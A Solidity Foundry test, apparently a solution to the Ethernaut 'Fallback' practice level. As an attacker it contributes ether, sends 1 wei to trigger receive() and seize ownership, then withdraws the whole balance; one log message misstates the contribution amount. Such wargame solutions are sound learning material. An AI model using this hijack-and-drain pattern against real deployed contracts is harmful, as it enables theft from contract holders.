// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public levelInstance;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        levelInstance = new Fallback();
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        console.log("Contribute con 0.0001 ether...");
        levelInstance.contribute{value: 0.0005 ether}();

        console.log("Enviando ether directamente para activar receive()...");
        (bool success, ) = address(levelInstance).call{value: 1 wei}("");
        require(success, "Transfer failed");

        assertEq(levelInstance.owner(), attacker);
        console.log("Ownership secuestrado con exito!");

        levelInstance.withdraw();
        assertEq(address(levelInstance).balance, 0);
        console.log("Contrato drenado. Balance final: 0");

        vm.stopPrank();
    }
}
